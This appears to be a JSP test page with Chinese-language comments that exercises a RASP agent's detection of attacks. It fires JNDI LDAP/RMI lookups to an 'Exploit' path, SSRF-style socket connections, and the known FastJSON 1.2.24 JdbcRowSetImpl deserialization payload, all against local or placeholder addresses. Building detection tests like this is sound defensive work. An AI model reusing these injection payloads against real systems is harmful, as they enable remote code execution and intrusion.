<%@ page contentType="text/html; charset=UTF-8" pageEncoding="UTF-8" %>
<%@ page import="javax.naming.*, java.net.*, java.io.*, javax.naming.directory.*" %>
<%
String action = request.getParameter("action");
String result = "";
String error = "";
String detected = "";

if (action != null) {
    try {
        if ("jndi-ldap".equals(action)) {
            // 测试1: JNDI LDAP注入 - 触发 checkConnect("127.0.0.1", 1389)
            // 端口1389不在白名单中 → 基础分30 + JNDI端口加分20 = 50 → BLOCK
            System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
            InitialContext ctx = new InitialContext();
            ctx.lookup("ldap://127.0.0.1:1389/Exploit");
            result = "JNDI LDAP lookup 已执行（预期被 SecurityManager 阻断）";

        } else if ("jndi-rmi".equals(action)) {
            // 测试2: JNDI RMI注入 - 触发 checkConnect("127.0.0.1", 1099)
            // 端口1099不在白名单中 → 基础分30 + RMI端口加分20 = 50 → BLOCK
            System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
            InitialContext ctx = new InitialContext();
            ctx.lookup("rmi://127.0.0.1:1099/Exploit");
            result = "JNDI RMI lookup 已执行（预期被 SecurityManager 阻断）";

        } else if ("jndi-ldaps".equals(action)) {
            // 测试3: JNDI LDAPS注入 - 触发 checkConnect("127.0.0.1", 636)
            // 端口636不在白名单中 + LDAP相关端口加分
            System.setProperty("com.sun.jndi.ldap.object.trustURLCodebase", "true");
            InitialContext ctx = new InitialContext();
            ctx.lookup("ldaps://127.0.0.1:636/Exploit");
            result = "JNDI LDAPS lookup 已执行（预期被 SecurityManager 阻断）";

        } else if ("jndi-dns".equals(action)) {
            // 测试4: JNDI DNS外连 - 触发 checkConnect("127.0.0.1", 5353)
            // 端口5353不在白名单中 → 基础分30 → 告警级
            InitialContext ctx = new InitialContext();
            ctx.lookup("dns://127.0.0.1:5353/example.com");
            result = "JNDI DNS lookup 已执行（预期产生告警）";

        } else if ("ssrf-socket".equals(action)) {
            // 测试5: SSRF - Socket直连非标准端口 → checkConnect("8.8.8.8", 4444)
            // 端口4444不在白名单中 → 基础分30 → 告警级
            Socket s = new Socket();
            s.connect(new InetSocketAddress("8.8.8.8", 4444), 1000);
            s.close();
            result = "Socket 外连已执行（预期产生告警）";

        } else if ("ssrf-url".equals(action)) {
            // 测试6: SSRF - URL.openConnection → checkConnect("192.168.1.1", 8081)
            // 端口8081不在白名单中 → 基础分30 → 告警级
            URL url = new URL("http://192.168.1.1:8081/");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(1000);
            conn.connect();
            conn.disconnect();
            result = "URL 外连已执行（预期产生告警）";

        } else if ("ssrf-nonstandard".equals(action)) {
            // 测试7: SSRF - 极端非标准端口 → checkConnect("10.0.0.1", 6666)
            // 端口6666不在白名单中 → 基础分30 → 告警级
            Socket s = new Socket();
            s.connect(new InetSocketAddress("10.0.0.1", 6666), 1000);
            s.close();
            result = "非标准端口外连已执行（预期产生告警）";

        } else if ("normal-db".equals(action)) {
            // 对照组: MySQL端口连接 → checkConnect("127.0.0.1", 3306)
            // 端口3306在白名单中 → isKnownServicePort返回true → 直接return，不进入检测
            // 预期：无告警（正常数据库连接不应被拦截）
            try {
                Socket s = new Socket();
                s.connect(new InetSocketAddress("127.0.0.1", 3306), 500);
                s.close();
                result = "MySQL 端口连接已执行（预期无告警 - 白名单端口）";
            } catch (Exception e) {
                result = "MySQL 端口连接尝试已执行（预期无告警 - 白名单端口）: " + e.getMessage();
            }

        } else if ("normal-http".equals(action)) {
            // 对照组: HTTP端口连接 → checkConnect("www.baidu.com", 443)
            // 端口443在白名单中 → 直接return
            try {
                URL url = new URL("https://www.baidu.com");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setConnectTimeout(2000);
                conn.connect();
                conn.disconnect();
                result = "HTTPS 端口连接已执行（预期无告警 - 白名单端口）";
            } catch (Exception e) {
                result = "HTTPS 端口连接尝试已执行（预期无告警 - 白名单端口）: " + e.getMessage();
            }

        } else if ("fastjson-jndi".equals(action)) {
            // 测试8: FastJSON JdbcRowSetImpl JNDI注入
            // 需要 fastjson-1.2.24.jar 在 WEB-INF/lib 中
            try {
                Class<?> jsonClass = Class.forName("com.alibaba.fastjson.JSON");
                String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\"," +
                    "\"dataSourceName\":\"ldap://127.0.0.1:1389/Exploit\"," +
                    "\"autoCommit\":true}";
                java.lang.reflect.Method parseMethod = jsonClass.getMethod("parse", String.class);
                parseMethod.invoke(null, payload);
                result = "FastJSON JNDI 注入已执行（预期: checkConnect(1389) + 异常）";
            } catch (ClassNotFoundException e) {
                error = "fastjson.jar 未找到！请下载 fastjson-1.2.24.jar 放入 WEB-INF/lib/ 目录";
            }
        }
    } catch (javax.naming.CommunicationException e) {
        result = "连接失败（符合预期 - 无 LDAP 服务器在目标端口）";
        detected = "SecurityManager 应已在此之前触发 checkConnect 检测";
    } catch (java.net.ConnectException e) {
        result = "连接失败（符合预期 - 目标不可达）";
        detected = "SecurityManager 应已在此之前触发 checkConnect 检测";
    } catch (java.net.SocketTimeoutException e) {
        result = "连接超时（符合预期 - 目标不可达）";
        detected = "SecurityManager 应已在此之前触发 checkConnect 检测";
    } catch (SecurityException e) {
        result = "请求已被 RASP 阻断: " + e.getMessage();
        detected = "BLOCK 模式生效 - 请求被安全拦截";
    } catch (Exception e) {
        error = e.getClass().getSimpleName() + ": " + e.getMessage();
    }
}
%>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<title>反序列化攻击检测测试</title>
<style>
  body { font-family: 'Microsoft YaHei', sans-serif; background:#0d1117; color:#c9d1d9; margin:0; padding:20px; }
  h1 { color:#58a6ff; border-bottom:1px solid #30363d; padding-bottom:10px; }
  h2 { color:#f0883e; font-size:16px; margin-top:30px; }
  .card { background:#161b22; border:1px solid #30363d; border-radius:6px; padding:16px; margin:12px 0; }
  .card p { color:#8b949e; font-size:13px; margin:4px 0 10px; }
  button { background:#238636; color:#fff; border:none; padding:8px 16px; border-radius:4px; cursor:pointer; font-size:13px; }
  button:hover { background:#2ea043; }
  button.db { background:#1f6feb; }
  button.db:hover { background:#388bfd; }
  .result { margin-top:16px; padding:12px; border-radius:4px; font-size:13px; }
  .success { background:#0d3320; border:1px solid #238636; color:#7ee787; }
  .error { background:#3d1522; border:1px solid #da3633; color:#f87171; }
  .info { background:#122840; border:1px solid #1f6feb; color:#79c0ff; }
  .score { display:inline-block; background:#30363d; color:#f0883e; padding:2px 8px; border-radius:3px; font-size:11px; margin-left:8px; }
  .warn { color:#f59e0b; font-size:12px; }
  table { width:100%; border-collapse:collapse; margin:16px 0; font-size:13px; }
  th { background:#21262d; text-align:left; padding:8px 12px; border:1px solid #30363d; }
  td { padding:8px 12px; border:1px solid #30363d; }
  .block { color:#f87171; font-weight:bold; }
  .alarm { color:#f59e0b; }
  .pass { color:#7ee787; }
  .tag-block { background:#da3633; color:#fff; padding:1px 6px; border-radius:3px; font-size:11px; }
  .tag-alarm { background:#9e6a03; color:#fff; padding:1px 6px; border-radius:3px; font-size:11px; }
  .tag-pass { background:#238636; color:#fff; padding:1px 6px; border-radius:3px; font-size:11px; }
</style>
</head>
<body>

<h1>反序列化 / JNDI / SSRF 攻击检测测试</h1>
<p style="color:#8b949e">用于验证 RASP Agent 对反序列化层的插桩覆盖效果</p>

<div class="card" style="background:#122840;border-color:#1f6feb">
  <p style="color:#79c0ff"><strong>前置条件：</strong>RASP Agent 已部署，Central Manager 运行中，可查看 /alerts 页面观察检测结果</p>
  <p style="color:#79c0ff">FastJSON 测试需要 <code>fastjson-1.2.24.jar</code> 放入 <code>WEB-INF/lib/</code> 目录</p>
</div>

<h2>预期检测结果速查表</h2>
<table>
<tr><th>测试用例</th><th>触发端口</th><th>基础分</th><th>加分</th><th>总分</th><th>预期行为</th></tr>
<tr><td>JNDI LDAP</td><td>1389</td><td class="alarm">30</td><td class="alarm">+20 (JNDI)</td><td class="block">50</td><td><span class="tag-block">BLOCK</span> (>=50)</td></tr>
<tr><td>JNDI RMI</td><td>1099</td><td class="alarm">30</td><td class="alarm">+20 (JNDI)</td><td class="block">50</td><td><span class="tag-block">BLOCK</span> (>=50)</td></tr>
<tr><td>JNDI LDAPS</td><td>636</td><td class="alarm">30</td><td class="alarm">+20 (LDAP)</td><td class="block">50</td><td><span class="tag-block">BLOCK</span> (>=50)</td></tr>
<tr><td>JNDI DNS</td><td>5353</td><td class="alarm">30</td><td>-</td><td class="alarm">30</td><td><span class="tag-alarm">ALARM</span> (20-49)</td></tr>
<tr><td>SSRF Socket</td><td>4444</td><td class="alarm">30</td><td>-</td><td class="alarm">30</td><td><span class="tag-alarm">ALARM</span> (20-49)</td></tr>
<tr><td>SSRF URL</td><td>8081</td><td class="alarm">30</td><td>-</td><td class="alarm">30</td><td><span class="tag-alarm">ALARM</span> (20-49)</td></tr>
<tr><td>SSRF 非标准</td><td>6666</td><td class="alarm">30</td><td>-</td><td class="alarm">30</td><td><span class="tag-alarm">ALARM</span> (20-49)</td></tr>
<tr><td>FastJSON JNDI</td><td>1389</td><td class="alarm">30</td><td class="alarm">+20 (JNDI)</td><td class="block">50</td><td><span class="tag-block">BLOCK</span> (>=50)</td></tr>
<tr><td>MySQL 正常</td><td>3306</td><td>-</td><td>-</td><td class="pass">0</td><td><span class="tag-pass">PASS</span> 白名单</td></tr>
<tr><td>HTTPS 正常</td><td>443</td><td>-</td><td>-</td><td class="pass">0</td><td><span class="tag-pass">PASS</span> 白名单</td></tr>
</table>

<% if (result != null && !result.isEmpty()) { %>
<div class="result success"><%= result %></div>
<% } %>
<% if (detected != null && !detected.isEmpty()) { %>
<div class="result info"><%= detected %></div>
<% } %>
<% if (error != null && !error.isEmpty()) { %>
<div class="result error"><%= error %></div>
<% } %>

<h2>JNDI 注入测试</h2>

<div class="card">
  <h2>1. JNDI LDAP 注入 (得分 50 → BLOCK)</h2>
  <p>执行 <code>InitialContext.lookup("ldap://127.0.0.1:1389/Exploit")</code></p>
  <p class="warn">端口 1389 不在白名单中，LDAP端口加分 +20 → 总分 50</p>
  <form method="post"><input type="hidden" name="action" value="jndi-ldap"><button>执行</button></form>
</div>

<div class="card">
  <h2>2. JNDI RMI 注入 (得分 50 → BLOCK)</h2>
  <p>执行 <code>InitialContext.lookup("rmi://127.0.0.1:1099/Exploit")</code></p>
  <p class="warn">端口 1099 不在白名单中，RMI端口加分 +20 → 总分 50</p>
  <form method="post"><input type="hidden" name="action" value="jndi-rmi"><button>执行</button></form>
</div>

<div class="card">
  <h2>3. JNDI LDAPS 注入 (得分 50 → BLOCK)</h2>
  <p>执行 <code>InitialContext.lookup("ldaps://127.0.0.1:636/Exploit")</code></p>
  <p class="warn">端口 636 不在白名单中，LDAP端口加分 +20 → 总分 50</p>
  <form method="post"><input type="hidden" name="action" value="jndi-ldaps"><button>执行</button></form>
</div>

<div class="card">
  <h2>4. JNDI DNS 外连 (得分 30 → ALARM)</h2>
  <p>执行 <code>InitialContext.lookup("dns://127.0.0.1:5353/example.com")</code></p>
  <p class="warn">端口 5353 不在白名单中，无JNDI端口加分 → 总分 30</p>
  <form method="post"><input type="hidden" name="action" value="jndi-dns"><button>执行</button></form>
</div>

<h2>SSRF 外连测试</h2>

<div class="card">
  <h2>5. Socket 直连非标准端口 (得分 30 → ALARM)</h2>
  <p>执行 <code>new Socket().connect("8.8.8.8", 4444)</code></p>
  <p class="warn">端口 4444 不在白名单中 → 基础分 30</p>
  <form method="post"><input type="hidden" name="action" value="ssrf-socket"><button>执行</button></form>
</div>

<div class="card">
  <h2>6. URL.connect 非标准端口 (得分 30 → ALARM)</h2>
  <p>执行 <code>new URL("http://192.168.1.1:8081/").openConnection().connect()</code></p>
  <p class="warn">端口 8081 不在白名单中 → 基础分 30</p>
  <form method="post"><input type="hidden" name="action" value="ssrf-url"><button>执行</button></form>
</div>

<div class="card">
  <h2>7. 极端非标准端口 (得分 30 → ALARM)</h2>
  <p>执行 <code>new Socket().connect("10.0.0.1", 6666)</code></p>
  <p class="warn">端口 6666 不在白名单中 → 基础分 30</p>
  <form method="post"><input type="hidden" name="action" value="ssrf-nonstandard"><button>执行</button></form>
</div>

<h2>FastJSON 反序列化测试 (需要 fastjson.jar)</h2>

<div class="card">
  <h2>8. FastJSON JdbcRowSetImpl JNDI 注入 (得分 50 → BLOCK)</h2>
  <p>执行 <code>JSON.parse("{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",...}")</code></p>
  <p class="warn">fastjson 反序列化 → JNDI lookup → checkConnect(1389) → 总分 50</p>
  <p class="warn"><strong>依赖：</strong>fastjson-1.2.24.jar 需放入 WEB-INF/lib/</p>
  <form method="post"><input type="hidden" name="action" value="fastjson-jndi"><button>执行</button></form>
</div>

<h2>对照组：正常业务连接 (白名单端口)</h2>

<div class="card">
  <h2>9. MySQL 数据库连接 (应通过 - 白名单端口 3306)</h2>
  <p>执行 <code>new Socket().connect("127.0.0.1", 3306)</code></p>
  <p style="color:#7ee787">端口 3306 在白名单中 → isKnownServicePort 返回 true → 跳过检测</p>
  <form method="post"><input type="hidden" name="action" value="normal-db"><button class="db">执行</button></form>
</div>

<div class="card">
  <h2>10. HTTPS 正常请求 (应通过 - 白名单端口 443)</h2>
  <p>执行 <code>new URL("https://www.baidu.com").openConnection()</code></p>
  <p style="color:#7ee787">端口 443 在白名单中 → isKnownServicePort 返回 true → 跳过检测</p>
  <form method="post"><input type="hidden" name="action" value="normal-http"><button class="db">执行</button></form>
</div>

<h2>部署说明</h2>
<div class="card" style="font-size:13px">
  <p><strong>1. 部署 JSP</strong></p>
  <code style="background:#0d1117;padding:4px 8px;border-radius:3px">cp deserialization-test.jsp /opt/tomcat85/webapps/examples/</code>

  <p style="margin-top:16px"><strong>2. 可选：部署 FastJSON (测试用例8需要)</strong></p>
  <p style="font-size:12px;color:#8b949e">下载 fastjson-1.2.24.jar 放入 WEB-INF/lib 或 Tomcat lib/ 目录，重启 Tomcat</p>

  <p style="margin-top:16px"><strong>3. 访问测试页</strong></p>
  <code style="background:#0d1117;padding:4px 8px;border-radius:3px">http://your-host:8080/examples/deserialization-test.jsp</code>

  <p style="margin-top:16px"><strong>4. 观察告警</strong></p>
  <p style="font-size:12px;color:#8b949e">打开 Central Manager /alerts 页面，执行测试后刷新查看 [Outbound] 告警</p>
</div>

</body>
</html>
